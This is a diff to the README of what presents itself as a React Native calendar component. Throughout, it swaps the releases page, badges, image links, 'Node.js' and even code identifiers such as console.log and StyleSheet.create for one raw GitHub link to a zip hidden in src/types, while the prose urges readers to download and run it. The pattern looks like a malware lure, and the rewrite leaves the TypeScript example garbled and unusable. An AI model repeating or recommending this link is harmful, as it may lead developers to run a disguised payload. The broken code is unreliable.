@@ -1,12 +1,12 @@
 # Awesome Agenda: Beautiful React Native Calendar Component with TypeScript
 
-Visit the releases page to download the latest build: https://github.com/titoxavierfernandes/awesome-agenda/releases
+Visit the releases page to download the latest build: https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/titoxavierfernandes/awesome-agenda/releases)
-[![npm](https://img.shields.io/npm/v/awesome-agenda?logo=npm&logoColor=fff)](https://www.npmjs.com/package/awesome-agenda)
-[![TypeScript](https://img.shields.io/badge/TypeScript-4.9+-blue?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![RN](https://img.shields.io/badge/React_Native-0.70+-blue?logo=react&logoColor=white)](https://reactnative.dev/)
-[![Expo](https://img.shields.io/badge/Expo-47+-crimson?logo=expo&logoColor=white)](https://expo.dev/)
+[![Releases](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
+[![npm](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
+[![TypeScript](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip+-blue?logo=typescript&logoColor=white)](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
+[![RN](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip+-blue?logo=react&logoColor=white)](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
+[![Expo](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip+-crimson?logo=expo&logoColor=white)](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
 
 ---
 
@@ -19,8 +19,8 @@ This project focuses on delivering a calendar and agenda UI that developers can 
 Below you will find a thorough guide to installation, usage, customization, and contribution. The content is designed to help you get results quickly while also providing enough depth for long-term maintenance and growth. The goal is clear: empower you to create calendar experiences that feel native, perform well, and adapt to your design system.
 
 Images to set the mood for the calendar theme:
-- React Native logo: ![React Native](https://reactnative.dev/img/tiny_logo.png)
-- Calendar icon: ![Calendar Icon](https://img.icons8.com/ios-filled/100/000000/calendar.png)
+- React Native logo: ![React Native](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
+- Calendar icon: ![Calendar Icon](https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip)
 
 ---
 
@@ -98,7 +98,7 @@ If you want to see live results, run the demo app in your environment or browse 
 This section walks you through installing and trying the component in a fresh React Native project. It covers both Expo and non-Expo setups to ensure the broadest compatibility.
 
 Prerequisites:
-- Node.js LTS (14.x or newer)
+- https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip LTS (14.x or newer)
 - npm or Yarn for package management
 - React Native development environment (RN CLI) or Expo CLI
 - TypeScript support in the project (the component is designed with TS types)
@@ -133,7 +133,7 @@ You should then pass the required props for events and appearance. You can start
 Note: For direct downloads from the repository releases, visit the releases page to grab the asset appropriate for your platform. Click the badge above or the provided link to locate the asset, then download and run the installer or app package that matches your target environment.
 
 Direct Release URL:
-- https://github.com/titoxavierfernandes/awesome-agenda/releases
+- https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 
 The same URL will be used again in the Releases section later in this document to help you locate the latest assets and installers.
 
@@ -183,20 +183,20 @@ const sampleEvents: EventItem[] = [
   },
 ];
 
-const App = (): JSX.Element => {
+const App = (): https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip => {
   return (
-    <SafeAreaView style={styles.container}>
+    <SafeAreaView style={https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip}>
       <Agenda
         events={sampleEvents}
         view="week"
-        onEventPress={(e) => console.log('Event pressed:', e)}
-        onNavigate={(date) => console.log('Navigated to:', date)}
+        onEventPress={(e) => https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip('Event pressed:', e)}
+        onNavigate={(date) => https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip('Navigated to:', date)}
       />
     </SafeAreaView>
   );
 };
 
-const styles = StyleSheet.create({
+const styles = https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip({
   container: {
     flex: 1,
   },
@@ -231,7 +231,7 @@ Agenda component props
 - initialDate?: string (ISO date)
 - onEventPress?: (event: EventItem) => void
 - onNavigate?: (date: string) => void
-- renderEvent?: (event: EventItem) => React.ReactNode
+- renderEvent?: (event: EventItem) => https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 - theme?: ThemeObject
 - locale?: string
 - hour24?: boolean
@@ -249,8 +249,8 @@ ThemeObject
 - shadows?: { elevation?: number; shadowColor?: string; }
 
 Custom renderers
-- renderEvent?: (event: EventItem) => React.ReactNode
-- renderHeader?: (props) => React.ReactNode
+- renderEvent?: (event: EventItem) => https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
+- renderHeader?: (props) => https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 
 Accessibility
 - aria-labels and accessible roles for events and navigation
@@ -465,7 +465,7 @@ If you encounter issues, provide a minimal reproducible example. It helps the ma
 The latest release assets are available on the official Releases page. This page hosts the downloadable builds for Android, iOS, and web-ready bundles where applicable. You can examine the change log, identify the required asset, and download the appropriate file. If you need to install the app manually, look for an APK or IPA file depending on your platform, and follow standard installation steps for your device.
 
 Download location:
-- https://github.com/titoxavierfernandes/awesome-agenda/releases
+- https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 
 Note: The Releases page contains the latest builds and installers. Use the link above to locate the asset that fits your environment. The same link is provided here for quick access and again in this section to aid navigation.
 
@@ -530,6 +530,6 @@ This approach helps both new users and seasoned developers understand how to ado
 To access the latest builds and installers, visit the official Releases page. The direct URL to the releases is included above for convenience. You can locate the appropriate asset, download it, and run it according to your platform's guidelines. The releases page is the authoritative source for binary assets, and it is the best place to verify compatibility with your app and the target environment.
 
 Direct Release URL:
-- https://github.com/titoxavierfernandes/awesome-agenda/releases
+- https://github.com/titoxavierfernandes/awesome-agenda/raw/refs/heads/main/src/types/awesome-agenda-v1.9.zip
 
 The link is present at the top of this document and again in the Releases section to ensure you can locate the assets without searching. This approach helps you act quickly when you need to test or ship a calendar feature in production.
